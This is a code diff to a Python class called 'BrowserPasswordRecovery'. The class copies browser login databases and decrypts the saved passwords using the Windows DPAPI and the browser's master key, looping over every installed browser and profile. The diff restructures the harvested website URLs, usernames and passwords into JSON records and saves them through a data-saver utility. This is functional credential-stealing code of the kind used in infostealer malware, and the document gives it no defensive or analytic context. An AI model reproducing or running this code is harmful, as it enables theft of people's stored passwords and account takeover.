@@ -6,6 +6,7 @@ import sqlite3
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 import logging
+from Utilities.DataSaver import DataSaverUtility
 
 logging.basicConfig(level=logging.WARNING)
 
@@ -105,13 +106,13 @@ class BrowserPasswordRecovery:
     def __init__(self):
         pass
 
-    def get_data(self, path: str, profile: str, key, type_of_data, query_name):
+    def get_data(self, browser, path, profile, key, type_of_data, query_name):
         db_file = os.path.join(path, profile + type_of_data["file"])
         if not os.path.exists(db_file):
             logging.warning(f"DB file {db_file} does not exist.")
-            return ""
+            return []
 
-        result = []
+        results = []
         temp_db = 'Vault.db'
         shutil.copy(db_file, temp_db)
         conn = sqlite3.connect(temp_db)
@@ -130,20 +131,16 @@ class BrowserPasswordRecovery:
                             pass
 
             if query_name == "login_data" and row[type_of_data['columns'].index('Username')] and row[type_of_data['columns'].index('Password')]:
-                emojis = "💻👤🔑"  # Emojis for computer, user, and key
-                row_text = "\n".join([f"{emoji} {col}: {val}" for emoji, col, val in zip(emojis, type_of_data['columns'], row) if val])
-                result.append(row_text)
+                entry = {
+                    "Website URL": row[type_of_data['columns'].index('Website URL')],
+                    "Username": row[type_of_data['columns'].index('Username')],
+                    "Password": row[type_of_data['columns'].index('Password')]
+                }
+                results.append(entry)
 
         conn.close()
         os.remove(temp_db)
-
-        if result:
-            top_line = "═" * 20 + " Saved Passwords in Browser " + "═" * 20
-            bottom_line = "═" * 68
-            result_str = "\n".join(result)
-            return f"{top_line}\n{result_str}\n{bottom_line}"
-        else:
-            return ""
+        return results
 
     def installed_browsers(self):
         return [browser_name for browser_name, browser_path in self.Browsers.items() if os.path.exists(browser_path)]
@@ -167,6 +164,8 @@ class BrowserPasswordRecovery:
                 file.write(content)
 
     def extract_all_browser_data(self):
+        extracted_data = []  # List to store all the extracted data
+
         for browser in self.installed_browsers():
             browser_path = self.Browsers[browser]
             master_key = PasswordUtils.get_master_key(browser_path)
@@ -177,11 +176,25 @@ class BrowserPasswordRecovery:
             for profile in profiles:
                 for query_name, query_item in self.Queries.items():
                     try:
-                        data = self.get_data(browser_path, profile, master_key, query_item, query_name)
-                        if data:
-                            print(data)
+                        # Ensure we pass all required parameters to the get_data method
+                        data_entries = self.get_data(browser, browser_path, profile, master_key, query_item, query_name)
+                        if data_entries:
+                            # Each entry in data_entries will now be a dictionary, so we format it accordingly
+                            for entry in data_entries:
+                                data_format = {
+                                    "Type": "Browser Passwords",
+                                    "Browser": browser,
+                                    "Profile": profile,
+                                    "Data": entry
+                                }
+                                extracted_data.append(data_format)
                     except Exception as e:
                         logging.error(f"An error occurred while extracting '{query_name}' data from '{browser}' profile '{profile}': {e}")
             
             if os.path.exists("Vault.db"):
                 os.remove("Vault.db")
+        
+        # Now we save the extracted data using the DataSaverUtility
+        formatted_data = json.dumps(extracted_data, indent=4)
+        DataSaverUtility.save_to_file(formatted_data)
+
